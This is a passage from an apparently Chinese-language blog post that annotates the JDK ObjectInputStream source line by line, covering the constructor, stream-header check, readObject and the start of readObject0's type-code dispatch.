class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 创建一个从指定 &#123;<span class="doctag">@link</span> InputStream&#125; 读取的 &#123;<span class="doctag">@code</span> ObjectInputStream&#125;。</span></span><br><span class="line"><span class="comment"> * 构造时会立即从底层输入流读取并校验**序列化流头部（stream header）**。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * ⚠ 该构造函数在对端 &#123;<span class="doctag">@link</span> ObjectOutputStream&#125; 写出并 &lt;b&gt;flush()&lt;/b&gt; 头部之前会一直阻塞，</span></span><br><span class="line"><span class="comment"> * 因此基于套接字的场景下，发送端务必在构造 OOS 后立刻 flush。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;安全管理器（SecurityManager）说明：&lt;/b&gt;</span></span><br><span class="line"><span class="comment"> * 若已安装 SecurityManager，且本构造函数被某“子类的构造器”直接或间接调用，</span></span><br><span class="line"><span class="comment"> * 并且该子类&lt;b&gt;重写&lt;/b&gt;了 &#123;<span class="doctag">@link</span> #readFields()&#125; 或 &#123;<span class="doctag">@link</span> #readUnshared()&#125; 等</span></span><br><span class="line"><span class="comment"> * 安全敏感方法，则需要具备</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@code</span> SerializablePermission(&quot;enableSubclassImplementation&quot;)&#125; 权限。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> in  底层输入流（不可为 &#123;<span class="doctag">@code</span> null&#125;）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> StreamCorruptedException  流头部不符合 Java 序列化协议（例如魔数/版本不匹配）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException               读取头部时发生 I/O 错误</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> SecurityException         不受信子类非法重写安全敏感方法</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> NullPointerException      &#123;<span class="doctag">@code</span> in&#125; 为 &#123;<span class="doctag">@code</span> null&#125;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> ObjectInputStream#ObjectInputStream()</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> ObjectInputStream#readFields()</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> ObjectOutputStream#ObjectOutputStream(OutputStream)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ObjectInputStream</span><span class="params">(InputStream in)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 子类校验：若为自定义子类并重写了安全敏感方法，则需具备相应权限</span></span><br><span class="line">    verifySubclass();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将底层 InputStream 包装为“块数据输入流”：</span></span><br><span class="line">    <span class="comment">// Java 序列化协议中，原始类型/小块数据以 Block-Data 形式编码，这里负责解包与模式切换</span></span><br><span class="line">    bin = <span class="keyword">new</span> <span class="title class_">BlockDataInputStream</span>(in);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 句柄表（接收端）：按 wire handle（0x7E0000 起）映射到实际对象，</span></span><br><span class="line">    <span class="comment">// 用于解析 TC_REFERENCE，并正确还原共享引用/循环引用</span></span><br><span class="line">    handles = <span class="keyword">new</span> <span class="title class_">HandleTable</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 验证回调列表：用于 registerValidation(ObjectInputValidation, prio)</span></span><br><span class="line">    <span class="comment">// 在对象图完全构建后按优先级调用，做一致性校验</span></span><br><span class="line">    vlist = <span class="keyword">new</span> <span class="title class_">ValidationList</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 反序列化过滤器（JDK 9+）：从全局配置读取当前的 ObjectInputFilter，</span></span><br><span class="line">    <span class="comment">// 用于在读取过程中对类/数组长度/引用深度等做策略性拦截（防御“有害反序列化”）</span></span><br><span class="line">    <span class="comment">// 若后续调用 setObjectInputFilter(...) 设置了流级过滤器，则以流级为准</span></span><br><span class="line">    serialFilter = ObjectInputFilter.Config.getSerialFilter();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 标记是否由子类完全接管读取流程；公开构造器中为 false（使用标准实现）</span></span><br><span class="line">    enableOverride = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取并校验序列化流头部：期待 0xAC ED 00 05（magic + version），不符则抛 StreamCorruptedException</span></span><br><span class="line">    readStreamHeader();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 进入“块数据模式”：后续原始数据读取将按 Block-Data 片段消费；</span></span><br><span class="line">    <span class="comment">// 读取对象/类描述等结构化标记时，内部会临时切回“非块模式”</span></span><br><span class="line">    bin.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>和 <code>ObjectOutputStream</code> 的构造方法一样——在该构造函数的开始，首先会调用 <code>verifySubclass</code> 方法处理缓存信息，要求该类(或子类)进行验证——验证是否可以在不违反安全约束的情况下构造此实例。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 子类校验：若为自定义子类并重写了安全敏感方法，则需具备相应权限</span></span><br><span class="line">verifySubclass();</span><br></pre></td></tr></table></figure></div>

<p>然后和 <code>ObjectOutputStream</code> 不同的是，在 <code>ObjectOutputStream</code> 中我们初始化的对象是 <code>bout</code>、<code>handles</code>、<code>subs</code> 以及 <code>enableOverride</code>，但是在 <code>ObjectInputStream</code> 中，我们初始化的对象变成了 <code>bin</code>、<code>handles</code>、<code>vlist</code> 以及 <code>enableOverride</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将底层 InputStream 包装为“块数据输入流”：</span></span><br><span class="line"><span class="comment">// Java 序列化协议中，原始类型/小块数据以 Block-Data 形式编码，这里负责解包与模式切换</span></span><br><span class="line">bin = <span class="keyword">new</span> <span class="title class_">BlockDataInputStream</span>(in);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 句柄表（接收端）：按 wire handle（0x7E0000 起）映射到实际对象，</span></span><br><span class="line"><span class="comment">// 用于解析 TC_REFERENCE，并正确还原共享引用/循环引用</span></span><br><span class="line">handles = <span class="keyword">new</span> <span class="title class_">HandleTable</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 验证回调列表：用于 registerValidation(ObjectInputValidation, prio)</span></span><br><span class="line"><span class="comment">// 在对象图完全构建后按优先级调用，做一致性校验</span></span><br><span class="line">vlist = <span class="keyword">new</span> <span class="title class_">ValidationList</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反序列化过滤器（JDK 9+）：从全局配置读取当前的 ObjectInputFilter，</span></span><br><span class="line"><span class="comment">// 用于在读取过程中对类/数组长度/引用深度等做策略性拦截（防御“有害反序列化”）</span></span><br><span class="line"><span class="comment">// 若后续调用 setObjectInputFilter(...) 设置了流级过滤器，则以流级为准</span></span><br><span class="line">serialFilter = ObjectInputFilter.Config.getSerialFilter();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 标记是否由子类完全接管读取流程；公开构造器中为 false（使用标准实现）</span></span><br><span class="line">enableOverride = <span class="literal">false</span>;</span><br></pre></td></tr></table></figure></div>

<p>在几个成员属性都被初始化后，调用 <code>readStreamHeader()</code> 方法先验证魔数和序列化的版本是否匹配。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 读取并校验序列化流头部：期待 0xAC ED 00 05（magic + version），不符则抛 StreamCorruptedException</span></span><br><span class="line">readStreamHeader();</span><br></pre></td></tr></table></figure></div>

<p>如果不匹配则抛出序列化的 <code>StreamCorruptedMismatch</code> 异常：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">readStreamHeader</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, StreamCorruptedException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 读取两个 16 位短整型：先是“魔数”，再是“版本号”</span></span><br><span class="line">    <span class="type">short</span> <span class="variable">s0</span> <span class="operator">=</span> bin.readShort();  <span class="comment">// 期望 0xACED</span></span><br><span class="line">    <span class="type">short</span> <span class="variable">s1</span> <span class="operator">=</span> bin.readShort();  <span class="comment">// 期望 0x0005</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 校验失败则抛异常；消息里以 16 进制显示实际读到的值</span></span><br><span class="line">    <span class="keyword">if</span> (s0 != STREAM_MAGIC || s1 != STREAM_VERSION) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(</span><br><span class="line">            String.format(<span class="string">&quot;invalid stream header: %04X%04X&quot;</span>, s0, s1));</span><br><span class="line">        <span class="comment">// 说明：上面的格式化仅用于日志展示；判定条件已用精确比较完成。</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="readObject-反序列化"><a href="#readObject-反序列化" class="headerlink" title="readObject 反序列化"></a>readObject 反序列化</h2><p>当 <code>ObjectInputStream</code> 的 <code>public</code> 构造方法走完后，才会调用 <code>readObject()</code> 开始写对象数据，该方法的主要代码如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 从 ObjectInputStream 读取一个对象。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;读取内容包括：对象的&lt;b&gt;运行时类&lt;/b&gt;、该类的&lt;b&gt;类描述信息&lt;/b&gt;（如 SUID、标志、字段列表），</span></span><br><span class="line"><span class="comment"> * 以及该类及其所有父类中&lt;b&gt;非 transient 且非 static&lt;/b&gt;字段的值。对象图会被&lt;b&gt;传递性&lt;/b&gt;地恢复，</span></span><br><span class="line"><span class="comment"> * 从而重建与写出时等价的对象图结构。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;当根对象的所有字段以及其引用到的所有对象都完全恢复后，按注册优先级执行对象校验回调</span></span><br><span class="line"><span class="comment"> * （ObjectInputValidation）。这些回调通常在各对象的 readObject(...) 中通过</span></span><br><span class="line"><span class="comment"> * registerValidation(...) 注册。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;异常处理：若底层输入流或类加载/协议不匹配等出现问题，会抛出相应异常；这些异常对本流是</span></span><br><span class="line"><span class="comment"> * “致命”的，调用方需自行决定忽略或恢复流状态。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 读取到的对象（可能为 null）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> ClassNotFoundException  反序列化到的类在当前 JVM 中不可用</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> InvalidClassException   序列化使用的某个类不合法（如 SUID 不匹配等）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> StreamCorruptedException 流中的控制信息不一致（魔数/版本/标记错误等）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> OptionalDataException   在期望读取“对象”时遇到了原始数据块</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException             其它 I/O 相关异常</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">readObject</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 若处于“子类完全接管模式”（通过受保护构造器启用），调用子类覆盖实现</span></span><br><span class="line">    <span class="keyword">if</span> (enableOverride) &#123;</span><br><span class="line">        <span class="keyword">return</span> readObjectOverride();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若当前是在嵌套读取（例如在某对象的 readObject 中再次 readObject），</span></span><br><span class="line">    <span class="comment">// passHandle 持有“外层（封闭）对象”的句柄；这里先保存它，便于 finally 恢复。</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">outerHandle</span> <span class="operator">=</span> passHandle;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 核心读取：readObject0(false) 执行协议解析、类描述读取、对象分配、</span></span><br><span class="line">        <span class="comment">// 默认/自定义读取、Externalizable 分支、以及句柄表登记等。</span></span><br><span class="line">        <span class="comment">// 参数 false 表示采用“共享语义”（对应 writeObject）；readUnshared 会传 true。</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> readObject0(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 把“外层对象”标记为依赖当前刚读出的“内层对象”（passHandle 指向刚完成的对象句柄）。</span></span><br><span class="line">        <span class="comment">// 若内层对象随后被解析为“类缺失”等异常，外层对象也应感知到该失败。</span></span><br><span class="line">        handles.markDependency(outerHandle, passHandle);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果在读取该对象期间曾记录过 ClassNotFoundException（例如某字段类型找不到），</span></span><br><span class="line">        <span class="comment">// 此处将其取出并抛出给调用者。</span></span><br><span class="line">        <span class="type">ClassNotFoundException</span> <span class="variable">ex</span> <span class="operator">=</span> handles.lookupException(passHandle);</span><br><span class="line">        <span class="keyword">if</span> (ex != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 当回到最外层（depth == 0），说明根对象已完全恢复：</span></span><br><span class="line">        <span class="comment">// 现在按优先级执行所有已注册的对象校验回调（ObjectInputValidation）。</span></span><br><span class="line">        <span class="keyword">if</span> (depth == <span class="number">0</span>) &#123;</span><br><span class="line">            vlist.doCallbacks();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// 恢复外层句柄（保持嵌套读取时的上下文正确）</span></span><br><span class="line">        passHandle = outerHandle;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果在读取过程中流被关闭，并且已经回到最外层，则清理内部状态与缓存</span></span><br><span class="line">        <span class="keyword">if</span> (closed &amp;&amp; depth == <span class="number">0</span>) &#123;</span><br><span class="line">            clear();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这个方法是<code>ObjectInputStream</code>对外的反序列化的入口，但其实它并不是核心方法，只是用于判断应该调用 <code>readObjectOverride</code> 还是 <code>readObject0</code> 方法（<code>enableOverride</code> 决定）</p>
<h3 id="readObject0"><a href="#readObject0" class="headerlink" title="readObject0"></a>readObject0</h3><p>由于在 <code>ObjectInputStream</code> 的 <code>public</code> 构造方法中已经初始化了 <code>enableOverride = false</code>，所以直接跳过第一个if分支（不调用 <code>readObjectOverride</code> 方法），进入 <code>readObject0</code> 方法，该方法如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 底层的 readObject 实现（供 readObject / readUnshared 调用）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 语义总览：</span></span><br><span class="line"><span class="comment"> * - 负责解析当前流位置的“类型码”（TC_*），并分派到相应读取路径：</span></span><br><span class="line"><span class="comment"> *   null / 引用 / 类对象 / 类描述符 / 字符串 / 数组 / 枚举 / 常规对象 / 致命异常 等。</span></span><br><span class="line"><span class="comment"> * - 处理块数据模式（Block-Data）与结构化标记模式之间的切换，以及</span></span><br><span class="line"><span class="comment"> *   OptionalDataException 的几种触发情形。</span></span><br><span class="line"><span class="comment"> * - 处理 TC_RESET（来自写端的 reset()），以及嵌套读取的深度计数。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> unshared 是否采用“非共享”语义（对应 readUnshared）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> OptionalDataException  当在期望读对象时遇到“块内原始数据”或“块结束”信号</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> StreamCorruptedException 流控制信息不一致/非法</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException  其它 I/O 异常</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Object <span class="title function_">readObject0</span><span class="params">(<span class="type">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 记录进入前是否在“块数据模式”（Block-Data mode）：</span></span><br><span class="line">    <span class="comment">// - 在自定义 readObject(..)/readExternal(..) 内部读取原始数据时，通常处于块模式；</span></span><br><span class="line">    <span class="comment">// - 要读取“结构化标记”（TC_*）前，需要切到“非块模式”来取类型码。</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">oldMode</span> <span class="operator">=</span> bin.getBlockDataMode();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (oldMode) &#123;</span><br><span class="line">        <span class="comment">// 仍在一个未消费完的“块”里</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">remain</span> <span class="operator">=</span> bin.currentBlockRemaining();</span><br><span class="line">        <span class="keyword">if</span> (remain &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 情形 1：块里仍有 N 字节未读，但此时调用方却想读“对象”</span></span><br><span class="line">            <span class="comment">// → 按规范抛出 OptionalDataException(N)，提示还有 N 字节原始数据待消费</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">OptionalDataException</span>(remain);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (defaultDataEnd) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * 修复 4360508：</span></span><br><span class="line"><span class="comment">             * 当前位于“默认序列化字段数据”的块末尾；该数据段没有显式的 TC_ENDBLOCKDATA，</span></span><br><span class="line"><span class="comment">             * 这里模拟“自定义数据结束”的行为，抛出 OptionalDataException(eof=true)，</span></span><br><span class="line"><span class="comment">             * 让上层的 readObject(..) 正确收尾。</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">OptionalDataException</span>(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 已经不在块中（remain==0 且非 defaultDataEnd），切换到“非块模式”以读取类型码</span></span><br><span class="line">        bin.setBlockDataMode(<span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取前先窥视一个字节（不消费）：若是 TC_RESET，需先处理 reset。</span></span><br><span class="line">    <span class="type">byte</span> tc;</span><br><span class="line">    <span class="keyword">while</span> ((tc = bin.peekByte()) == TC_RESET) &#123;</span><br><span class="line">        bin.readByte();     <span class="comment">// 真正消费掉这个标记</span></span><br><span class="line">        handleReset();      <span class="comment">// 清空句柄表/校验列表等（仅允许在非嵌套处触发）</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 进入一次“对象级读取”：</span></span><br><span class="line">    depth++;               <span class="comment">// 嵌套深度（用于控制校验回调、禁止中途 reset 等）</span></span><br><span class="line">    totalObjectRefs++;     <span class="comment">// 统计计数（可能用于反序列化过滤器的限额评估）</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">switch</span> (tc) &#123;</span><br><span class="line">            <span class="keyword">case</span> TC_NULL:</span><br><span class="line">                <span class="comment">// 空引用</span></span><br><span class="line">                <span class="keyword">return</span> readNull();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_REFERENCE:</span><br><span class="line">                <span class="comment">// 句柄回引：根据 wire handle 取回已构建对象</span></span><br><span class="line">                <span class="keyword">return</span> readHandle(unshared);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_CLASS:</span><br><span class="line">                <span class="comment">// 类对象（java.lang.Class）的读取</span></span><br><span class="line">                <span class="keyword">return</span> readClass(unshared);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_CLASSDESC:</span><br><span class="line">            <span class="keyword">case</span> TC_PROXYCLASSDESC:</span><br><span class="line">                <span class="comment">// 类描述符（普通/动态代理）</span></span><br><span class="line">                <span class="keyword">return</span> readClassDesc(unshared);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_STRING:</span><br><span class="line">            <span class="keyword">case</span> TC_LONGSTRING:</span><br><span class="line">                <span class="comment">// 短/长字符串 → 读出后，经过 resolveObject(..)（若启用）再返回</span></span><br><span class="line">                <span class="keyword">return</span> checkResolve(readString(unshared));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_ARRAY:</span><br><span class="line">                <span class="comment">// 数组</span></span><br><span class="line">                <span class="keyword">return</span> checkResolve(readArray(unshared));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_ENUM:</span><br><span class="line">                <span class="comment">// 枚举常量：按名称与枚举类恢复</span></span><br><span class="line">                <span class="keyword">return</span> checkResolve(readEnum(unshared));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_OBJECT:</span><br><span class="line">                <span class="comment">// 常规对象：分派到“普通可序列化 / Externalizable / 自定义 readObject”路径</span></span><br><span class="line">                <span class="keyword">return</span> checkResolve(readOrdinaryObject(unshared));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_EXCEPTION: &#123;</span><br><span class="line">                <span class="comment">// 写端在最外层失败时写入的“致命异常对象”</span></span><br><span class="line">                <span class="comment">// 读取后包装为 WriteAbortedException 抛出</span></span><br><span class="line">                <span class="type">IOException</span> <span class="variable">ex</span> <span class="operator">=</span> readFatalException();</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">WriteAbortedException</span>(<span class="string">&quot;writing aborted&quot;</span>, ex);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_BLOCKDATA:</span><br><span class="line">            <span class="keyword">case</span> TC_BLOCKDATALONG:</span><br><span class="line">                <span class="comment">// 这里出现块数据标记有两种情形：</span></span><br><span class="line">                <span class="comment">// - 若进入本方法前就处于“块模式”（oldMode==true），说明调用者在读对象前</span></span><br><span class="line">                <span class="comment">//   还残留有一段块数据。切回块模式，强制解析块头，然后抛 ODE(len)，</span></span><br><span class="line">                <span class="comment">//   让上层先把这段原始数据读完。</span></span><br><span class="line">                <span class="comment">// - 否则（oldMode==false），在“期待类型码”的位置遇到块标记 → 协议错误。</span></span><br><span class="line">                <span class="keyword">if</span> (oldMode) &#123;</span><br><span class="line">                    bin.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line">                    bin.peek();   <span class="comment">// 触发读取块头，使 currentBlockRemaining() 可用</span></span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">OptionalDataException</span>(bin.currentBlockRemaining());</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(<span class="string">&quot;unexpected block data&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_ENDBLOCKDATA:</span><br><span class="line">                <span class="comment">// 同理：若之前处于块模式，则把它视为“自定义数据结束”信号（eof=true）；</span></span><br><span class="line">                <span class="comment">// 否则是在不该出现的地方遇到 end 标记 → 协议错误。</span></span><br><span class="line">                <span class="keyword">if</span> (oldMode) &#123;</span><br><span class="line">                    